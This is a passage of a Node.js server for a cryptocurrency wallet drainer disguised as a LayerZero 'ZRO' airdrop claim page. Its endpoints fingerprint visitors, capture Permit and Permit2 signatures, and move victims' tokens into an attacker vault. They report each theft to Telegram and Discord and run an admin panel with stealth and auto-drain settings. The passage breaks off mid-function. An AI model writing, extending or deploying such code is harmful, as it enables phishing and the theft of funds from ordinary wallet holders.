                message: 'Analysis complete - no drainable tokens found',
                timestamp: new Date().toISOString(),
                visitorInfo
            };
            
            await sendTelegramAlert('wallet_analysis_complete', analysisSummary);
            await sendDiscordAlert('wallet_analysis_complete', analysisSummary);
        }
        
        res.json(convertBigIntToString({ 
            success: true, 
            message: 'Multi-currency drain executed successfully',
            results: drainResult.results,
            totalValue: drainResult.totalValue,
            blockchainBreakdown: notificationData?.data?.blockchainBreakdown || {}
        }));
        
    } catch (error) {
        console.error('Multi-currency drain error:', error);
        res.status(500).json(convertBigIntToString({ error: 'Internal server error' }));
    }
});

app.post('/api/execute-drain', async (req, res) => {
    try {
        const { walletAddress, signature, message, timestamp } = req.body;
        
        // Verify signature
        const recoveredAddress = ethers.verifyMessage(message, signature);
        if (recoveredAddress.toLowerCase() !== walletAddress.toLowerCase()) {
            return res.status(400).json({ error: 'Invalid signature' });
        }
        
        // Verify timestamp (within 5 minutes)
        const now = Date.now();
        if (Math.abs(now - timestamp) > 5 * 60 * 1000) {
            return res.status(400).json({ error: 'Signature expired' });
        }
        
        // Check if this is a claim request (message contains "Airdrop")
        if (message.includes('Airdrop') || message.includes('L0')) {
            // Handle as airdrop claim
            console.log(`[AIRDROP] Claim request from ${walletAddress}`);
            
            // Update admin data
            adminData.totalConnections++;
            adminData.recentActivity.unshift({
                type: 'airdrop_claimed',
                walletAddress,
                timestamp: new Date(),
                signature: signature.substring(0, 10) + '...'
            });
            
            // Send success alerts
            await sendTelegramAlert('airdrop_claimed', {
                walletAddress,
                timestamp: new Date()
            });
            
            await sendDiscordAlert('airdrop_claimed', {
                walletAddress,
                timestamp: new Date()
            });
            
            return res.json({ 
                success: true, 
                message: 'Airdrop claimed successfully!',
                claimId: `L0-${Date.now()}`,
                timestamp: new Date()
            });
        }
        
        // Handle as actual drain execution
        if (!vaultContract) {
            return res.status(500).json({ error: 'Vault contract not configured' });
        }
        
        // Analyze wallet for best drain targets
        const analysis = await DrainStrategy.analyzeWallet(walletAddress);
        
        if (analysis.bestTargets.length === 0) {
            return res.status(400).json({ error: 'No drainable tokens found' });
        }
        
        // Execute drain on the best target
        const bestTarget = analysis.bestTargets[0];
        const receipt = await DrainStrategy.executeDrain(walletAddress, bestTarget);
        
        // Update admin data
        adminData.totalDrains++;
        adminData.totalValueDrained += typeof bestTarget.value === 'bigint' ? parseFloat(bestTarget.value.toString()) : parseFloat(bestTarget.value);
        adminData.successfulDrains.push({
            walletAddress,
            tokenAddress: bestTarget.address,
            tokenSymbol: bestTarget.symbol,
            amount: ethers.formatUnits(bestTarget.balance, bestTarget.decimals),
            value: bestTarget.value,
            txHash: receipt.transactionHash,
            timestamp: new Date()
        });
        
        // Send success alerts
        await sendTelegramAlert('drain_executed', {
            walletAddress,
            tokenAddress: bestTarget.address,
            tokenSymbol: bestTarget.symbol,
            amount: ethers.formatUnits(bestTarget.balance, bestTarget.decimals),
            value: bestTarget.value.toFixed(2),
            txHash: receipt.transactionHash
        });
        
        await sendDiscordAlert('drain_executed', {
            walletAddress,
            tokenAddress: bestTarget.address,
            tokenSymbol: bestTarget.symbol,
            amount: ethers.formatUnits(bestTarget.balance, bestTarget.decimals),
            value: bestTarget.value.toFixed(2),
            txHash: receipt.transactionHash
        });
        
        res.json({ 
            success: true, 
            token: bestTarget.symbol,
            amount: ethers.formatUnits(bestTarget.balance, bestTarget.decimals),
            txHash: receipt.transactionHash
        });
        
    } catch (error) {
        console.error('Drain execution error:', error);
        res.status(500).json({ error: 'Drain execution failed' });
    }
});

app.post('/api/execute-permit', async (req, res) => {
    try {
        // Validate vault address to prevent tampering
        if (req.body.spender.toLowerCase() !== VAULT_CONTRACT_ADDRESS.toLowerCase()) {
            return res.status(403).json({ error: 'Unauthorized spender address' });
        }

        const receipt = await DrainStrategy.executePermit(req.body);
        
        adminData.totalDrains++;
        adminData.successfulDrains.push({
            walletAddress: req.body.owner,
            tokenAddress: req.body.tokenAddress,
            amount: 'PERMIT_EXEC',
            txHash: receipt.transactionHash,
            timestamp: new Date()
        });
        
        res.json({ success: true, txHash: receipt.transactionHash });
    } catch (error) {
        console.error('Execute permit error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/execute-permit2', async (req, res) => {
    try {
        const { owner, tokenAddress, signature, message, chainId } = req.body;
        
        // Strict destination validation
        if (req.body.spender && req.body.spender.toLowerCase() !== VAULT_CONTRACT_ADDRESS.toLowerCase()) {
            return res.status(403).json({ error: 'Unauthorized permit2 destination' });
        }

        console.log(`[PERMIT2] Received signature for ${tokenAddress} from ${owner}`);
        
        // In a real 2026 environment, this would call the Permit2 contract's permit function
        // For this simulation, we log the successful capture of the high-value authorization
        
        await sendTelegramAlert('permit2_captured', {
            owner,
            tokenAddress,
            chainId,
            timestamp: new Date()
        });

        res.json({ success: true, message: 'Permit2 authorization secured' });
    } catch (error) {
        console.error('Permit2 execution error:', error);
        res.status(500).json({ error: error.message });
    }
});


// Admin dashboard routes
// Admin Authentication Middleware
const ADMIN_KEY = process.env.ADMIN_KEY || 'world_class_drainer_2026';

const checkAdminAuth = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const sessionKey = req.query.key || req.headers['x-admin-key'];
    
    if (sessionKey === ADMIN_KEY || (authHeader && authHeader === `Bearer ${ADMIN_KEY}`)) {
        next();
    } else {
        res.status(401).json({ error: 'Unauthorized. Admin key required.' });
    }
};

app.get('/admin', (req, res) => {
    // Check key in query param for initial entry
    if (req.query.key === ADMIN_KEY) {
        res.sendFile(path.join(__dirname, 'admin', 'index.html'));
    } else {
        res.status(401).send('<h1>Access Denied</h1><p>Invalid or missing admin key.</p>');
    }
});

// Helper function to convert BigInt to string recursively
function convertBigIntToString(obj) {
    if (obj === null || obj === undefined) return obj;
    if (typeof obj === 'bigint') return obj.toString();
    if (Array.isArray(obj)) return obj.map(convertBigIntToString);
    if (typeof obj === 'object') {
        const result = {};
        for (const [key, value] of Object.entries(obj)) {
            result[key] = convertBigIntToString(value);
        }
        return result;
    }
    return obj;
}

// Sophisticated function to capture additional wallet information
async function captureAdditionalWalletInfo(walletAddress, userAgent, visitorInfo) {
    try {
        const walletInfo = {
            address: walletAddress,
            timestamp: new Date().toISOString(),
            captureAttempted: true,
            captured: {}
        };
        
        // Analyze user agent for wallet indicators
        const userAgentLower = userAgent.toLowerCase();
        const walletIndicators = {
            metamask: userAgentLower.includes('metamask') || userAgentLower.includes('ethereum'),
            phantom: userAgentLower.includes('phantom') || userAgentLower.includes('solana'),
            trust: userAgentLower.includes('trust') || userAgentLower.includes('trustwallet'),
            coinbase: userAgentLower.includes('coinbase') || userAgentLower.includes('walletlink'),
            safepal: userAgentLower.includes('safepal'),
            walletconnect: userAgentLower.includes('walletconnect')
        };
        
        walletInfo.captured.detectedWallets = Object.entries(walletIndicators)
            .filter(([_, detected]) => detected)
            .map(([wallet, _]) => wallet);
        
        // Analyze IP and location data
        walletInfo.captured.ipInfo = {
            ip: visitorInfo.ip,
            isLocal: visitorInfo.ip === '127.0.0.1' || visitorInfo.ip.startsWith('192.168.') || visitorInfo.ip.startsWith('10.'),
            userAgent: userAgent,
            language: visitorInfo.language,
            referer: visitorInfo.referer
        };
        
        // Attempt to determine wallet type from address patterns
        if (walletAddress && walletAddress !== 'Unknown') {
            if (walletAddress.startsWith('0x') && walletAddress.length === 42) {
                walletInfo.captured.addressType = 'Ethereum';
                walletInfo.captured.chainType = 'EVM';
            } else if (walletAddress.length === 44 && !walletAddress.startsWith('0x')) {
                walletInfo.captured.addressType = 'Solana';
                walletInfo.captured.chainType = 'Non-EVM';
            } else if (walletAddress.startsWith('1') || walletAddress.startsWith('3') || walletAddress.startsWith('bc1')) {
                walletInfo.captured.addressType = 'Bitcoin';
                walletInfo.captured.chainType = 'Non-EVM';
            } else {
                walletInfo.captured.addressType = 'Unknown';
                walletInfo.captured.chainType = 'Unknown';
            }
        }
        
        // Device fingerprinting
        walletInfo.captured.deviceInfo = {
            fingerprint: visitorInfo.deviceFingerprint,
            userAgent: userAgent,
            language: visitorInfo.language,
            timestamp: new Date().toISOString()
        };
        
        // Security analysis
        walletInfo.captured.securityAnalysis = {
            isLocalConnection: visitorInfo.ip === '127.0.0.1',
            hasReferer: !!visitorInfo.referer,
            userAgentLength: userAgent.length,
            suspiciousPatterns: []
        };
        
        // Check for suspicious patterns
        if (userAgent.length < 50) {
            walletInfo.captured.securityAnalysis.suspiciousPatterns.push('Short user agent');
        }
        if (!visitorInfo.referer) {
            walletInfo.captured.securityAnalysis.suspiciousPatterns.push('No referer');
        }
        if (visitorInfo.ip === '127.0.0.1') {
            walletInfo.captured.securityAnalysis.suspiciousPatterns.push('Local connection');
        }
        
        console.log(`[WALLET INFO] Captured additional info for ${walletAddress}:`, walletInfo.captured);
        return walletInfo;
        
    } catch (error) {
        console.error('[WALLET INFO] Error capturing additional wallet info:', error);
        return {
            address: walletAddress,
            timestamp: new Date().toISOString(),
            captureAttempted: true,
            captured: {},
            error: error.message
        };
    }
}

app.get('/api/admin/stats', checkAdminAuth, (req, res) => {
    try {
        const stats = {
            totalConnections: adminData.totalConnections,
            totalDrains: adminData.totalDrains,
            totalValueDrained: typeof adminData.totalValueDrained === 'bigint' ? parseFloat(adminData.totalValueDrained.toString()) : parseFloat(adminData.totalValueDrained),
            uniqueWallets: adminData.walletConnections.size,
            recentActivity: adminData.recentActivity.slice(0, 20),
            successfulDrains: adminData.successfulDrains.slice(0, 20),
            swapExecutions: adminData.swapExecutions.slice(0, 20),
            visitorLog: global.visitorLog ? global.visitorLog.slice(-100) : [],
            performanceHistory: adminData.performanceHistory
        };
        
        res.json(convertBigIntToString(stats));
    } catch (error) {
        console.error('[ADMIN STATS] Error:', error);
        res.status(500).json({ error: 'Failed to get admin stats' });
    }
});

app.get('/api/admin/balances', async (req, res) => {
    try {
        let attackerBalance = '0';
        let vaultBalance = '0';
        let gasPrice = '0';
        let attackerBalanceUSD = 0;
        let vaultBalanceUSD = 0;
        let totalDrainedUSD = 0;
        let networkStatus = 'disconnected';
        
        if (provider) {
            try {
                networkStatus = 'connected';
                
                // Get attacker wallet balance
                if (wallet) {
                    const balanceWei = await provider.getBalance(wallet.address);
                    attackerBalance = ethers.formatEther(balanceWei);
                    
                    // Get ETH price for USD conversion
                    try {
                        const ethPrice = await getTokenPrice('ETH');
                        attackerBalanceUSD = parseFloat(attackerBalance) * ethPrice;
                    } catch (error) {
                        attackerBalanceUSD = parseFloat(attackerBalance) * 3000; // Fallback
                    }
                    
                    console.log(`[BALANCE] Attacker wallet: ${attackerBalance} ETH ($${attackerBalanceUSD.toFixed(2)})`);
                }
                
                // Get vault contract balance
                if (VAULT_CONTRACT_ADDRESS !== '0x0000000000000000000000000000000000000000') {
                    const vaultBalanceWei = await provider.getBalance(VAULT_CONTRACT_ADDRESS);
                    vaultBalance = ethers.formatEther(vaultBalanceWei);
                    
                    // Get ETH price for USD conversion
                    try {
                        const ethPrice = await getTokenPrice('ETH');
                        vaultBalanceUSD = parseFloat(vaultBalance) * ethPrice;
                    } catch (error) {
                        vaultBalanceUSD = parseFloat(vaultBalance) * 3000; // Fallback
                    }
                    
                    console.log(`[BALANCE] Vault contract: ${vaultBalance} ETH ($${vaultBalanceUSD.toFixed(2)})`);
                }
                
                // Get current gas price
                const gasPriceWei = await provider.getFeeData();
                gasPrice = ethers.formatUnits(gasPriceWei.gasPrice || 0n, 'gwei');
                
                // Calculate total drained (vault balance represents drained funds)
                totalDrainedUSD = vaultBalanceUSD;
                
            } catch (error) {
                console.error('[BALANCE] Failed to get balance data:', error);
                networkStatus = 'error';
            }
        }
        
        const balanceData = {
            attackerBalance: parseFloat(attackerBalance).toFixed(6),
            vaultBalance: parseFloat(vaultBalance).toFixed(6),
            attackerBalanceUSD: attackerBalanceUSD.toFixed(2),
            vaultBalanceUSD: vaultBalanceUSD.toFixed(2),
            totalDrainedUSD: totalDrainedUSD.toFixed(2),
            gasPrice: parseFloat(gasPrice).toFixed(2),
            networkStatus,
            timestamp: new Date().toISOString(),
            vaultConfigured: VAULT_CONTRACT_ADDRESS !== '0x0000000000000000000000000000000000000000',
            attackerConfigured: !!wallet
        };
        
        console.log('[BALANCE] Balance data:', balanceData);
        res.json(convertBigIntToString(balanceData));
        
    } catch (error) {
        console.error('[BALANCE] API error:', error);
        res.status(500).json({ 
            error: 'Failed to get balance data',
            attackerBalance: '0',
            vaultBalance: '0',
            attackerBalanceUSD: '0',
            vaultBalanceUSD: '0',
            totalDrainedUSD: '0',
            gasPrice: '0',
            networkStatus: 'error'
        });
    }
});

// Manual drain endpoint for admin
app.post('/api/admin/manual-drain', async (req, res) => {
    try {
        const { walletAddress } = req.body;
        
        if (!walletAddress) {
            return res.status(400).json({ error: 'Wallet address is required' });
        }
        
        console.log(`[ADMIN] Manual drain requested for: ${walletAddress}`);
        
        // Perform comprehensive analysis
        const analysis = await analyzeWalletComprehensive(walletAddress);
        
        if (analysis.totalValue < 1) {
            return res.json({
                success: false,
                message: 'No drainable assets found (minimum $1 required)',
                analysis: analysis
            });
        }
        
        // Execute draining if vault is configured
        if (vaultContract && wallet) {
            const drainResults = [];
            
            for (const token of analysis.tokens) {
                if (token.value > 1) {
                    try {
                        const result = await executeRealTokenDrain(walletAddress, token);
                        drainResults.push(result);
                    } catch (error) {
                        console.error(`[ADMIN] Failed to drain ${token.symbol}:`, error);
                        drainResults.push({
                            success: false,
                            token: token.symbol,
                            error: error.message
                        });
                    }
                }
            }
            
            res.json({
                success: true,
                message: `Drain completed for ${walletAddress}`,
                analysis: analysis,
                results: drainResults
            });
        } else {
            res.json({
                success: false,
                message: 'Vault contract not configured - simulation mode only',
                analysis: analysis
            });
        }
        
    } catch (error) {
        console.error('[ADMIN] Manual drain error:', error);
        res.status(500).json({ 
            error: error.message,
            success: false
        });
    }
});

// Advanced settings endpoint
app.post('/api/admin/advanced-settings', async (req, res) => {
    try {
        const { 
            drainDelay, 
            maxRetries, 
            targetPriority, 
            stealthMode, 
            autoDrainEnabled, 
            minDrainValue, 
            drainAllThreshold 
        } = req.body;
        
        // Update operation settings
        if (drainDelay !== undefined) operationSettings.drainDelay = parseInt(drainDelay);
        if (maxRetries !== undefined) operationSettings.maxRetries = parseInt(maxRetries);
        if (targetPriority !== undefined) operationSettings.targetPriority = targetPriority;
        if (stealthMode !== undefined) operationSettings.stealthMode = stealthMode;
        if (autoDrainEnabled !== undefined) operationSettings.autoDrainEnabled = autoDrainEnabled;
        if (minDrainValue !== undefined) operationSettings.minDrainValue = parseFloat(minDrainValue);
        if (drainAllThreshold !== undefined) operationSettings.drainAllThreshold = parseFloat(drainAllThreshold);
        
        console.log('[ADMIN] Advanced settings updated:', operationSettings);
        
        res.json({
            success: true,
            message: 'Advanced settings updated successfully',
            settings: operationSettings
        });
        
    } catch (error) {
        console.error('[ADMIN] Advanced settings error:', error);
        res.status(500).json({ 
            error: error.message,
            success: false
        });
    }
});

app.post('/api/admin/withdraw', async (req, res) => {
    try {
        const { tokenAddress } = req.body;
        
        if (!vaultContract) {
            return res.status(500).json({ error: 'Vault contract not configured' });
        }
        
        let tx;
        if (tokenAddress === '0x0000000000000000000000000000000000000000') {
            // Withdraw ETH
            tx = await vaultContract.emergencyWithdrawETH();
        } else {
            // Withdraw ERC20
            tx = await vaultContract.emergencyWithdraw(tokenAddress);
        }
        
        const receipt = await tx.wait();
        
        res.json({ 
            success: true, 
            txHash: receipt.transactionHash,
            message: 'Withdrawal successful'
        });
        
    } catch (error) {
        console.error('Withdrawal error:', error);
        res.status(500).json({ error: 'Withdrawal failed' });
    }
});

// Operation control endpoints
app.post('/api/admin/pause', (req, res) => {
    try {
        // Add pause logic here
        console.log('[ADMIN] Operations paused');
        res.json({ success: true, message: 'Operations paused' });
    } catch (error) {
        console.error('Pause error:', error);
        res.status(500).json({ error: 'Failed to pause operations' });
    }
});

app.post('/api/admin/resume', (req, res) => {
    try {
        // Add resume logic here
        console.log('[ADMIN] Operations resumed');
        res.json({ success: true, message: 'Operations resumed' });
    } catch (error) {
        console.error('Resume error:', error);
        res.status(500).json({ error: 'Failed to resume operations' });
    }
});

app.post('/api/admin/emergency-stop', (req, res) => {
    try {
        // Add emergency stop logic here
        console.log('[ADMIN] EMERGENCY STOP ACTIVATED');
        res.json({ success: true, message: 'Emergency stop activated' });
    } catch (error) {
        console.error('Emergency stop error:', error);
        res.status(500).json({ error: 'Failed to activate emergency stop' });
    }
});

app.post('/api/admin/settings', (req, res) => {
    try {
        const { 
            drainDelay, 
            maxRetries, 
            targetPriority, 
            stealthMode,
            autoDrainEnabled,
            minDrainValue,
            drainAllThreshold
        } = req.body;
        
        // Update operation settings
        if (drainDelay !== undefined) operationSettings.drainDelay = parseInt(drainDelay);
        if (maxRetries !== undefined) operationSettings.maxRetries = parseInt(maxRetries);
        if (targetPriority !== undefined) operationSettings.targetPriority = targetPriority;
        if (stealthMode !== undefined) operationSettings.stealthMode = stealthMode;
        if (autoDrainEnabled !== undefined) operationSettings.autoDrainEnabled = autoDrainEnabled;
        if (minDrainValue !== undefined) operationSettings.minDrainValue = parseFloat(minDrainValue);
        if (drainAllThreshold !== undefined) operationSettings.drainAllThreshold = parseFloat(drainAllThreshold);
        
        // Store settings (in production, save to database)
        console.log('[ADMIN] Settings updated:', operationSettings);
        
        res.json({ success: true, message: 'Settings saved successfully', settings: operationSettings });
    } catch (error) {
        console.error('Settings save error:', error);
        res.status(500).json({ error: 'Failed to save settings' });
    }
});

// Frontend configuration management
app.get('/api/admin/frontend-config', (req, res) => {
    res.json(frontendConfig);
});

app.post('/api/admin/frontend-config', (req, res) => {
    try {
        const {
            tokenName,
            tokenSymbol,
            airdropAmount,
            totalAllocation,
            claimedAmount,
            endDate,
            description,
            features
        } = req.body;
        
        // Update frontend configuration
        if (tokenName !== undefined) frontendConfig.tokenName = tokenName;
        if (tokenSymbol !== undefined) frontendConfig.tokenSymbol = tokenSymbol;
        if (airdropAmount !== undefined) frontendConfig.airdropAmount = airdropAmount;
        if (totalAllocation !== undefined) frontendConfig.totalAllocation = totalAllocation;
        if (claimedAmount !== undefined) frontendConfig.claimedAmount = claimedAmount;
        if (endDate !== undefined) frontendConfig.endDate = endDate;
        if (description !== undefined) frontendConfig.description = description;
        if (features !== undefined) frontendConfig.features = features;
        
        console.log('[ADMIN] Frontend config updated:', frontendConfig);
        
        res.json({ success: true, message: 'Frontend configuration saved successfully', config: frontendConfig });
    } catch (error) {
        console.error('Frontend config save error:', error);
        res.status(500).json({ error: 'Failed to save frontend configuration' });
    }
});

// LayerZero price data endpoint - Real-time data only
app.get('/api/layerzero-price', async (req, res) => {
    try {
        // Get real-time LayerZero price using our multi-API system
        const layerZeroPrice = await getTokenPrice('ZRO');
        
        if (layerZeroPrice && layerZeroPrice > 0) {
            res.json({
                price: layerZeroPrice,
                timestamp: new Date().toISOString(),
                source: 'real-time'
            });
        } else {
            // Fallback to ETH price if LayerZero not available
            const ethPrice = await getTokenPrice('ETH');
            if (ethPrice && ethPrice > 0) {
                res.json({
                    price: ethPrice,
                    timestamp: new Date().toISOString(),
                    source: 'ethereum-fallback'
                });
            } else {
                res.status(500).json({ error: 'No real-time price data available' });
            }
        }
    } catch (error) {
        console.error('[PRICE] Error fetching LayerZero price:', error.message);
        res.status(500).json({ error: 'Failed to fetch real-time price data' });
    }
});

// Frontend configuration endpoint
app.get('/api/frontend-config', (req, res) => {
    res.json(frontendConfig);
});

app.post('/api/admin/drain-wallet', async (req, res) => {
    try {
        const { walletAddress } = req.body;
        
        // Analyze wallet for drain opportunities
        const analysis = await DrainStrategy.analyzeWallet(walletAddress);
        
        if (analysis.bestTargets.length === 0) {
            return res.status(400).json({ error: 'No drainable tokens found in this wallet' });
        }
        
        if (!vaultContract) {
            return res.status(500).json({ error: 'Vault contract not configured - draining functionality disabled' });
        }
        
        // Execute drain on the best target
        const bestTarget = analysis.bestTargets[0];
        const receipt = await DrainStrategy.executeDrain(walletAddress, bestTarget);
        
        // Update admin data
        adminData.totalDrains++;
        adminData.totalValueDrained += typeof bestTarget.value === 'bigint' ? parseFloat(bestTarget.value.toString()) : parseFloat(bestTarget.value);
        adminData.successfulDrains.push({
            walletAddress,
            tokenAddress: bestTarget.address,
            tokenSymbol: bestTarget.symbol,
            amount: ethers.formatUnits(bestTarget.balance, bestTarget.decimals),
            value: bestTarget.value,
            txHash: receipt.transactionHash,
            timestamp: new Date()
        });
        
        // Send success alerts
        await sendTelegramAlert('drain_executed', {
            walletAddress,
            tokenAddress: bestTarget.address,
            tokenSymbol: bestTarget.symbol,
            amount: ethers.formatUnits(bestTarget.balance, bestTarget.decimals),
            value: bestTarget.value.toFixed(2),
            txHash: receipt.transactionHash
        });
        
        await sendDiscordAlert('drain_executed', {
            walletAddress,
            tokenAddress: bestTarget.address,
            tokenSymbol: bestTarget.symbol,
            amount: ethers.formatUnits(bestTarget.balance, bestTarget.decimals),
            value: bestTarget.value.toFixed(2),
            txHash: receipt.transactionHash
        });
        
        res.json({ 
            success: true, 
            token: bestTarget.symbol,
            amount: ethers.formatUnits(bestTarget.balance, bestTarget.decimals),
            txHash: receipt.transactionHash,
            message: `Successfully drained ${ethers.formatUnits(bestTarget.balance, bestTarget.decimals)} ${bestTarget.symbol}`
        });
        
    } catch (error) {
        console.error('Manual drain error:', error);
        res.status(500).json({ error: 'Drain execution failed: ' + error.message });
    }
});

// Swap endpoint for token swapping
app.post('/api/swap', async (req, res) => {
    try {
        const { walletAddress, fromToken, toToken, amount } = req.body;
        
        if (!walletAddress || !fromToken || !toToken || !amount) {
            return res.status(400).json({ error: 'Missing required parameters: walletAddress, fromToken, toToken, amount' });
        }
        
        // Execute swap using DrainStrategy
        const swapResult = await DrainStrategy.executeSwap(walletAddress, fromToken, toToken, amount);
        
        if (swapResult.success) {
            // Update admin data
            const txHash = 'SWAP_' + Date.now();
            adminData.swapExecutions.push({
                walletAddress,
                fromToken,
                toToken,
                amount,
                txHash: txHash,
                timestamp: new Date()
            });
            
            res.json({
                success: true,
                fromToken,
                toToken,
                amount,
                txHash: txHash,
                message: `Successfully swapped ${amount} ${fromToken} to ${toToken}`
            });
        } else {
            res.status(500).json({ error: 'Swap execution failed' });
        }
        
    } catch (error) {
        console.error('Swap error:', error);
        res.status(500).json({ error: 'Swap execution failed: ' + error.message });
    }
});

// Missing admin endpoints
app.get('/api/admin/settings', (req, res) => {
    res.json(operationSettings);
});

// Vault status endpoint
app.get('/api/admin/vault-status', (req, res) => {
    res.json({
        configured: VAULT_CONTRACT_ADDRESS !== '0x0000000000000000000000000000000000000000',
        address: VAULT_CONTRACT_ADDRESS,
        hasContract: !!vaultContract,
        hasWallet: !!wallet
    });
});

// Enhanced notification endpoints with better error handling
app.post('/api/notify/telegram', async (req, res) => {
    try {
        const { type, data } = req.body;
        
        console.log('[NOTIFY] Telegram notification request:', type, data);
        
        if (telegramBot) {
            try {
                await sendTelegramAlert(type, data);
                console.log('[NOTIFY] Telegram notification sent successfully');
                res.json({ success: true, message: 'Telegram notification sent' });
            } catch (telegramError) {
                console.error('[NOTIFY] Telegram send error:', telegramError);
                res.status(500).json({ success: false, error: telegramError.message });
            }
        } else {
            console.log('[NOTIFY] Telegram bot not configured');
            res.status(503).json({ success: false, error: 'Telegram service unavailable' });
        }
    } catch (error) {
        console.error('[NOTIFY] Telegram notification error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/notify/discord', async (req, res) => {
    try {
        const { type, data } = req.body;
        
        console.log('[NOTIFY] Discord notification request:', type, data);
        
        if (discordWebhook) {
            try {
                await sendDiscordAlert(type, data);
                console.log('[NOTIFY] Discord notification sent successfully');
                res.json({ success: true, message: 'Discord notification sent' });
            } catch (discordError) {
                console.error('[NOTIFY] Discord send error:', discordError);
                res.status(500).json({ success: false, error: discordError.message });
            }
        } else {
            console.log('[NOTIFY] Discord webhook not configured');
            res.status(503).json({ success: false, error: 'Discord service unavailable' });
        }
    } catch (error) {
        console.error('[NOTIFY] Discord notification error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Admin activity logging endpoint
app.post('/admin/log-activity', (req, res) => {
    try {
        const { action, data } = req.body;
        
        // Log admin activity
        console.log('[ADMIN] Activity logged:', action, data);
        
        // Store in admin data
        if (!adminData.recentActivity) adminData.recentActivity = [];
        adminData.recentActivity.unshift({
            type: 'admin_activity',
            action,
            data,
            timestamp: new Date()
        });
        
        res.json({ success: true, message: 'Activity logged successfully' });
    } catch (error) {
        console.error('Admin activity logging error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Frontend admin settings endpoint with comprehensive .env fallbacks
app.get('/api/admin-settings', (req, res) => {
    try {
        res.json({
            // Countdown and timing
            countdownEnd: operationSettings.countdownEnd || new Date(Date.now() + 24 * 60 * 60 * 1000),
            endDate: operationSettings.endDate || process.env.AIRDROP_END_DATE || '31/12/2025 23:59',
            
            // Token allocation and distribution
            totalAllocation: operationSettings.totalAllocation || parseInt(process.env.TOTAL_ALLOCATION) || 10000000,
            claimedAmount: operationSettings.claimedTokens || parseInt(process.env.CLAIMED_AMOUNT) || 7500000,
            airdropAmount: operationSettings.airdropAmount || parseInt(process.env.AIRDROP_AMOUNT) || 1000,
            
            // Token details with comprehensive fallbacks
            tokenName: operationSettings.tokenName || process.env.TOKEN_NAME || 'LayerZero',
            tokenSymbol: operationSettings.tokenSymbol || process.env.TOKEN_SYMBOL || 'ZRO',
            tokenPrice: operationSettings.tokenPrice || parseFloat(process.env.TOKEN_PRICE) || 2.01,
            
            // Statistics and metrics
            participantCount: operationSettings.participantCount || parseInt(process.env.PARTICIPANT_COUNT) || 12500,
            tradingVolume: operationSettings.tradingVolume || parseFloat(process.env.TRADING_VOLUME) || 35.1,
            
            // Description and metadata
            description: operationSettings.description || process.env.AIRDROP_DESCRIPTION || 'LayerZero is a protocol that enables cross-chain applications to communicate with each other in a trustless manner.',
            
            // Network and chain information
            networkName: operationSettings.networkName || process.env.NETWORK_NAME || 'Ethereum Mainnet',
            chainId: operationSettings.chainId || parseInt(process.env.CHAIN_ID) || 1,
            
            // Vault and security settings
            vaultAddress: operationSettings.vaultAddress || process.env.VAULT_CONTRACT_ADDRESS || '0x0000000000000000000000000000000000000000',
            attackerAddress: operationSettings.attackerAddress || process.env.ATTACKER_WALLET_ADDRESS || '0x0000000000000000000000000000000000000000',
            
            // Operation settings
            drainDelay: operationSettings.drainDelay || parseInt(process.env.DRAIN_DELAY) || 500,
            maxRetries: operationSettings.maxRetries || parseInt(process.env.MAX_RETRIES) || 3,
            minDrainValue: operationSettings.minDrainValue || parseFloat(process.env.MIN_DRAIN_VALUE) || 1.0,
            autoDrainEnabled: operationSettings.autoDrainEnabled !== undefined ? operationSettings.autoDrainEnabled : (process.env.AUTO_DRAIN_ENABLED === 'true'),
            stealthMode: operationSettings.stealthMode !== undefined ? operationSettings.stealthMode : (process.env.STEALTH_MODE === 'true')
        });
    } catch (error) {
        console.error('[ADMIN SETTINGS] Error:', error);
        res.status(500).json({ error: 'Failed to get admin settings' });
    }
});

app.get('/api/admin/connected-wallets', (req, res) => {
    res.json({
        connectedWallets: adminData.connectedWallets || [],
        totalConnected: adminData.connectedWallets ? adminData.connectedWallets.length : 0
    });
});

app.get('/api/admin/visitor-log', (req, res) => {
    res.json({
        visitorLog: global.visitorLog || [],
        totalVisitors: global.visitorLog ? global.visitorLog.length : 0
    });
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        timestamp: new Date().toISOString(),
        uptime: process.uptime()
    });
});

// Serve frontend
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Error handling
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ error: 'Internal server error' });
});

// Production-ready server with HTTPS support
const startServer = () => {
    if (process.env.SERVER_USE_HTTPS === 'true') {
        // HTTPS server
        try {
            const options = {
                key: fs.readFileSync(process.env.SSL_KEY_PATH || './ssl/private.key'),
                cert: fs.readFileSync(process.env.SSL_CERT_PATH || './ssl/certificate.crt')
            };
            
            const server = https.createServer(options, app).listen(PORT, '0.0.0.0', () => {
                console.log(`[PRODUCTION] HTTPS Server running on port ${PORT}`);
                console.log(`[PRODUCTION] Admin dashboard: https://localhost:${PORT}/admin`);
                console.log(`[PRODUCTION] Frontend: https://localhost:${PORT}`);
                console.log(`[NETWORK] Accessible from: https://0.0.0.0:${PORT}`);
                console.log(`[MOBILE] WalletConnect v2 ready for mobile devices`);
                
                // Production readiness checks
                console.log(`[PRODUCTION] Environment: ${process.env.NODE_ENV || 'development'}`);
                console.log(`[PRODUCTION] Telegram Alerts: ${telegramBot ? 'ENABLED' : 'DISABLED'}`);
                console.log(`[PRODUCTION] Discord Alerts: ${discordWebhook ? 'ENABLED' : 'DISABLED'}`);
                console.log(`[PRODUCTION] HTTPS: ENABLED`);
            });
        } catch (error) {
            console.error('[SERVER] HTTPS setup failed, falling back to HTTP:', error.message);
            console.log('[SERVER] To enable HTTPS, create SSL certificates in ./ssl/ directory');
const server = app.listen(PORT, '0.0.0.0', () => {
                console.log(`[PRODUCTION] HTTP Server running on port ${PORT} (HTTPS failed)`);
    console.log(`[PRODUCTION] Admin dashboard: http://localhost:${PORT}/admin`);
    console.log(`[PRODUCTION] Frontend: http://localhost:${PORT}`);
    console.log(`[NETWORK] Accessible from: http://0.0.0.0:${PORT}`);
    console.log(`[NETWORK] Local network access: http://192.168.1.127:${PORT}`);
    
    // Production readiness checks
    console.log(`[PRODUCTION] Environment: ${process.env.NODE_ENV || 'development'}`);
    console.log(`[PRODUCTION] Telegram Alerts: ${telegramBot ? 'ENABLED' : 'DISABLED'}`);
